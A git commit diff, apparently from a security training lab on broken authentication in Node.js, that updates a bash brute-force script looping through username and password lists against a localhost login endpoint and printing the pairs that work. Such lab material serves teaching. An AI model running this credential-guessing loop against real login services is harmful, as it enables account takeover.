31c18fd53ec9e05dbe3d6dade2544edaeb033068
Gabriel Pereira <gabrielgps2510@gmail.com>
2021-12-07 15:40:18 -0300

    feat: Improve lab5

--- lab5-nodejs-broken-autentication/black-hat-env/brutal-force/brute.sh
+++ lab5-nodejs-broken-autentication/black-hat-env/brutal-force/brute.sh
@@ -5,9 +5,8 @@ PASSWORDS_FILE=${2}
 
 for user in $(cat $USERNAMES_FILE); do
     for pass in $(cat $PASSWORDS_FILE); do
-        RESPONSE=$(curl -s -XPOST localhost:3000/login --header 'Content-Type:application/json' -d '{"username": "'$user'","password": "'$pass'"}')
-
-        if [[ $RESPONSE == *"token"* ]]; then
+        RESPONSE=$(curl -s -w "%{http_code}" -XPOST localhost:3001/login --header 'Content-Type:application/json' -d '{"username": "'$user'","password": "'$pass'"}')
+        if [[ $RESPONSE == "200" ]]; then
             echo "User:" $user " - Pass:" $pass " - Token: " $RESPONSE
             break;
         fi
